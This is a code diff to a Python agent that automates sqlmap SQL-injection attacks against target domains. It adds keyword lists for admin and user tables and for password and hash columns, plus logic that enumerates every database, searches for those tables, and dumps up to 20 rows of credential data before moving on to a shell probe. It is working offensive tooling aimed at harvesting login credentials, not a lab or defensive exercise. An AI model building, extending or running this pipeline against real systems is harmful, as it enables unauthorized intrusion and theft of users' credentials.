@@ -5,6 +5,7 @@ import hashlib
 import json
 import os
 import pickle
+import re
 import shutil
 import secrets
 import sqlite3
@@ -40,7 +41,29 @@ DEFAULT_SQLMAP_RISK = 3
 DEFAULT_SQLMAP_THREADS = 4
 DEFAULT_SQLMAP_TIMEOUT = 20
 DEFAULT_SQLMAP_RETRIES = 4
-AGENT_VERSION = "2.4.36"
+AGENT_VERSION = "2.4.53"
+
+SENSITIVE_TABLE_KEYWORDS = [
+    "admin",
+    "administrator",
+    "admins",
+    "user",
+    "users",
+    "member",
+    "members",
+    "account",
+    "accounts",
+    "manager",
+    "staff",
+    "sys_user",
+    "sys_users",
+    "wp_users",
+]
+SENSITIVE_TABLE_SEARCH_KEYWORDS = ["admin", "administrator", "user", "users", "member", "account", "manager", "staff"]
+USERNAME_COLUMN_KEYWORDS = ["user", "username", "login", "email", "account", "name", "mobile", "phone"]
+PASSWORD_COLUMN_KEYWORDS = ["pass", "passwd", "password", "pwd", "hash", "salt"]
+FAST_ENUM_TECHNIQUE_KEYWORDS = ["union query", "error-based", "stacked queries", "inline query"]
+SLOW_ENUM_TECHNIQUE_KEYWORDS = ["time-based blind", "boolean-based blind"]
 
 ENUM_ACTIONS = {
     "check_is_dba",
@@ -584,13 +607,20 @@ def watch_sqlmap_task(root_task_id, sqlmap_task_id, action):
 
 
 def finalize_job(root_task_id, sqlmap_task_id, action, error_message, return_code):
-    snapshot = build_scan_snapshot(root_task_id, include_logs=False)
     record = scan_records.get(root_task_id)
     action_args = {}
     with queue_lock:
         running_info = running_tasks.get(root_task_id, {})
         if running_info.get("action") == action:
             action_args = dict(running_info.get("action_args") or {})
+        # Drop the finished task before building the snapshot so the snapshot reports
+        # running=False. build_next_automation_job / build_empty_result_fallback_job
+        # bail out when the snapshot still looks "running", which previously stalled the
+        # automation chain right after initial_scan.
+        if root_task_id in running_tasks:
+            del running_tasks[root_task_id]
+
+    snapshot = build_scan_snapshot(root_task_id, include_logs=False)
 
     fallback_job = build_empty_result_fallback_job(root_task_id, action, action_args, snapshot)
     if record:
@@ -622,13 +652,13 @@ def finalize_job(root_task_id, sqlmap_task_id, action, error_message, return_cod
         if fallback_job:
             profile = get_fallback_profile(fallback_job["action_args"].get("fallback_index", 0))
             record["last_error"] = f"Enumeration returned empty result, retrying with {profile.get('label')}"
-        elif action not in record["automation"]["completed"]:
-            record["automation"]["completed"].append(action)
+        else:
+            if action not in record["automation"]["completed"]:
+                record["automation"]["completed"].append(action)
+            automation_key = action_args.get("automation_key")
+            if automation_key and automation_key not in record["automation"]["completed"]:
+                record["automation"]["completed"].append(automation_key)
         persist_record_metadata(record)
-
-    with queue_lock:
-        if root_task_id in running_tasks:
-            del running_tasks[root_task_id]
 
     if fallback_job:
         ok, _, _ = queue_job(
@@ -942,6 +972,11 @@ def normalize_scan_data(data_rows):
     is_dba = normalize_is_dba(by_type.get("is_dba"))
     dbs = normalize_dbs(by_type.get("dbs"))
     tables = normalize_tables(by_type.get("tables"))
+    for db_name, table_list in parse_search_tables(by_type.get("search")).items():
+        existing = tables.setdefault(db_name, [])
+        for table_name in table_list:
+            if table_name not in existing:
+                existing.append(table_name)
     columns = normalize_columns(by_type.get("columns"))
     if current_db and current_db not in dbs:
         dbs = [current_db] + dbs
@@ -983,11 +1018,159 @@ def merge_content(previous, current):
 def choose_priority_table(table_names):
     if not table_names:
         return None
-    ordered = sorted(table_names)
-    for table_name in ordered:
-        if "adm" in str(table_name).lower():
-            return table_name
-    return ordered[0]
+    sensitive = choose_sensitive_tables(table_names)
+    if sensitive:
+        return sensitive[0]
+    return sorted(table_names)[0]
+
+
+def lower_name(value):
+    return str(value or "").strip().lower()
+
+
+def is_sensitive_table(table_name):
+    name = lower_name(table_name)
+    if not name:
+        return False
+    return any(keyword in name for keyword in SENSITIVE_TABLE_KEYWORDS)
+
+
+def choose_sensitive_tables(table_names):
+    ordered = sorted([str(item) for item in table_names or [] if str(item or "").strip()])
+    admin_matches = [item for item in ordered if "adm" in lower_name(item) or "manager" in lower_name(item)]
+    other_matches = [item for item in ordered if item not in admin_matches and is_sensitive_table(item)]
+    return admin_matches + other_matches
+
+
+def automation_key(prefix, *parts):
+    normalized = [str(part or "").strip().lower() for part in parts if str(part or "").strip()]
+    return f"{prefix}:" + ".".join(normalized) if normalized else prefix
+
+
+def table_columns_from_snapshot(snapshot, database_name, table_name):
+    columns = snapshot.get("content", {}).get("columns")
+    if not isinstance(columns, dict):
+        return []
+    db_tables = columns.get(database_name) or {}
+    if not isinstance(db_tables, dict):
+        return []
+    table_columns = db_tables.get(table_name)
+    if isinstance(table_columns, dict):
+        return list(table_columns.keys())
+    if isinstance(table_columns, list):
+        return table_columns
+    return []
+
+
+def table_has_credential_columns(snapshot, database_name, table_name):
+    columns = [lower_name(item) for item in table_columns_from_snapshot(snapshot, database_name, table_name)]
+    if not columns:
+        return False
+    has_password = any(any(keyword in column for keyword in PASSWORD_COLUMN_KEYWORDS) for column in columns)
+    has_username = any(any(keyword in column for keyword in USERNAME_COLUMN_KEYWORDS) for column in columns)
+    return has_password and (has_username or is_sensitive_table(table_name))
+
+
+def iter_snapshot_tables(snapshot):
+    tables = snapshot.get("content", {}).get("tables")
+    if not isinstance(tables, dict):
+        return []
+    results = []
+    for db_name, table_list in tables.items():
+        if not isinstance(table_list, list):
+            continue
+        for table_name in choose_sensitive_tables(table_list):
+            results.append((db_name, table_name))
+    return results
+
+
+def should_full_table_enum(snapshot):
+    texts = []
+    for item in snapshot.get("content", {}).get("techniques", []) or []:
+        if not isinstance(item, dict):
+            continue
+        for entry in item.get("entries", []) or []:
+            if isinstance(entry, dict):
+                texts.append(str(entry.get("type") or ""))
+                texts.append(str(entry.get("title") or ""))
+    joined = " ".join(texts).lower()
+    if any(keyword in joined for keyword in FAST_ENUM_TECHNIQUE_KEYWORDS):
+        return True
+    if any(keyword in joined for keyword in SLOW_ENUM_TECHNIQUE_KEYWORDS):
+        return False
+    return True
+
+
+def find_next_database_without_tables(snapshot, completed):
+    dbs = snapshot.get("content", {}).get("dbs") or []
+    if not dbs:
+        first_db = get_first_database(snapshot)
+        dbs = [first_db] if first_db else []
+    tables = snapshot.get("content", {}).get("tables")
+    for db_name in dbs:
+        db_name = str(db_name or "").strip()
+        if not db_name:
+            continue
+        key = automation_key("get_tables", db_name)
+        if key in completed:
+            continue
+        if isinstance(tables, dict) and tables.get(db_name):
+            continue
+        return db_name
+    if not dbs and "get_tables" not in completed:
+        return ""
+    return None
+
+
+def find_next_sensitive_table_needing_columns(snapshot, completed):
+    for db_name, table_name in iter_snapshot_tables(snapshot):
+        key = automation_key("get_columns", db_name, table_name)
+        if key in completed:
+            continue
+        if has_columns_for_table(snapshot, db_name, table_name):
+            continue
+        return db_name, table_name
+    return None, None
+
+
+def find_next_sensitive_table_needing_dump(snapshot, completed):
+    for db_name, table_name in iter_snapshot_tables(snapshot):
+        key = automation_key("dump_table_data", db_name, table_name)
+        if key in completed:
+            continue
+        if has_dump_preview(snapshot, db_name, table_name):
+            continue
+        if not table_has_credential_columns(snapshot, db_name, table_name):
+            continue
+        return db_name, table_name
+    return None, None
+
+
+def find_next_sensitive_search_keyword(completed):
+    for keyword in SENSITIVE_TABLE_SEARCH_KEYWORDS:
+        key = automation_key("search_table", keyword)
+        if key not in completed:
+            return keyword
+    return None
+
+
+def parse_search_tables(raw_value):
+    text = json.dumps(raw_value, ensure_ascii=False) if isinstance(raw_value, (dict, list)) else str(raw_value or "")
+    results = {}
+    patterns = [
+        r"Database:\s*([^\n\r\[\]]+).*?Table:\s*([^\n\r\[\]]+)",
+        r"\[([^\]]+)\]\.\[([^\]]+)\]",
+        r"`([^`]+)`\.`([^`]+)`",
+    ]
+    for pattern in patterns:
+        for db_name, table_name in re.findall(pattern, text, flags=re.I | re.S):
+            db_name = str(db_name or "").strip(" `[]'\"\t\r\n")
+            table_name = str(table_name or "").strip(" `[]'\"\t\r\n")
+            if db_name and table_name and is_sensitive_table(table_name):
+                results.setdefault(db_name, [])
+                if table_name not in results[db_name]:
+                    results[db_name].append(table_name)
+    return results
 
 
 def build_tree(content, dump_files):
@@ -1356,6 +1539,12 @@ def action_has_meaningful_result(snapshot, action, action_args):
         return bool(database_name and table_name and has_columns_for_table(snapshot, database_name, table_name))
     if action in ("dump_first_row", "dump_table_data"):
         return bool(database_name and table_name and has_dump_preview(snapshot, database_name, table_name))
+    if action == "search":
+        raw_search = content.get("raw", {}).get("search") if isinstance(content.get("raw"), dict) else None
+        if raw_search not in (None, "", [], {}):
+            return True
+        tables = content.get("tables")
+        return isinstance(tables, dict) and any(bool(value) for value in tables.values())
     return True
 
 
@@ -1782,18 +1971,64 @@ def build_next_automation_job(root_task_id, snapshot):
         return None
 
     completed = set(record["automation"].get("completed", []))
-    is_dba = snapshot.get("content", {}).get("is_dba")
+    content = snapshot.get("content", {})
+    is_dba = content.get("is_dba")
     if "check_is_dba" not in completed and is_dba is None:
         return build_automation_job(root_task_id, "check_is_dba")
 
-    current_db = snapshot.get("content", {}).get("current_db")
+    current_db = content.get("current_db")
     if "get_current_db" not in completed and not current_db:
         return build_automation_job(root_task_id, "get_current_db")
 
-    database_name = current_db or get_first_database(snapshot)
-    tables = snapshot.get("content", {}).get("tables")
-    if "get_tables" not in completed and database_name and not (isinstance(tables, dict) and tables.get(database_name)):
-        return build_automation_job(root_task_id, "get_tables", {"db": database_name})
+    dbs = content.get("dbs")
+    if "get_dbs" not in completed and not (isinstance(dbs, list) and dbs):
+        return build_automation_job(root_task_id, "get_dbs")
+
+    if should_full_table_enum(snapshot):
+        db_name = find_next_database_without_tables(snapshot, completed)
+        if db_name is not None:
+            action_args = {"automation_key": automation_key("get_tables", db_name) if db_name else "get_tables"}
+            if db_name:
+                action_args["db"] = db_name
+            return build_automation_job(root_task_id, "get_tables", action_args)
+
+    keyword = find_next_sensitive_search_keyword(completed)
+    if keyword:
+        return build_automation_job(
+            root_task_id,
+            "search",
+            {
+                "search_kind": "table",
+                "search_query": keyword,
+                "automation_key": automation_key("search_table", keyword),
+            },
+        )
+
+    db_name, table_name = find_next_sensitive_table_needing_columns(snapshot, completed)
+    if db_name and table_name:
+        return build_automation_job(
+            root_task_id,
+            "get_columns",
+            {
+                "db": db_name,
+                "table": table_name,
+                "automation_key": automation_key("get_columns", db_name, table_name),
+            },
+        )
+
+    db_name, table_name = find_next_sensitive_table_needing_dump(snapshot, completed)
+    if db_name and table_name:
+        return build_automation_job(
+            root_task_id,
+            "dump_table_data",
+            {
+                "db": db_name,
+                "table": table_name,
+                "limit_start": 1,
+                "limit_stop": 20,
+                "automation_key": automation_key("dump_table_data", db_name, table_name),
+            },
+        )
 
     if "probe_shell" not in completed:
         return build_automation_job(root_task_id, "probe_shell")
@@ -1867,12 +2102,12 @@ def start_scan():
     force_ssl = bool(data.get("force_ssl", False))
     proxy = data.get("proxy") or ""
     requested_options = normalize_requested_options(data.get("options"))
-    share_by_domain = bool(data.get("share_by_domain", False))
+    share_by_domain = False
 
     if not all([domain, vuln_id, request_data]):
         return jsonify({"error": "Missing required fields"}), 400
 
-    if share_by_domain:
+    if False:
         shared_record = find_shared_record_by_domain(domain, proxy, force_ssl, requested_options)
         if shared_record and record_has_meaningful_snapshot(shared_record):
             root_task_id = f"shared-{secrets.token_hex(12)}"
@@ -1884,7 +2119,7 @@ def start_scan():
             record = create_record(root_task_id, domain, vuln_id, request_file, scan_root, force_ssl)
             record["proxy"] = proxy
             record["requested_options"] = requested_options
-            record["share_by_domain"] = True
+            record["share_by_domain"] = False
             record["active_task_id"] = ""
             clone_cache_from_record(shared_record, record)
             persist_record_metadata(record)
@@ -1899,7 +2134,7 @@ def start_scan():
     record = create_record(root_task_id, domain, vuln_id, request_file, scan_root, force_ssl)
     record["proxy"] = proxy
     record["requested_options"] = requested_options
-    record["share_by_domain"] = share_by_domain
+    record["share_by_domain"] = False
     persist_record_metadata(record)
     scan_data = build_follow_up_options(scan_records[root_task_id], "initial_scan", {})
     ok, message, _ = queue_job(root_task_id, root_task_id, scan_data, "initial_scan")
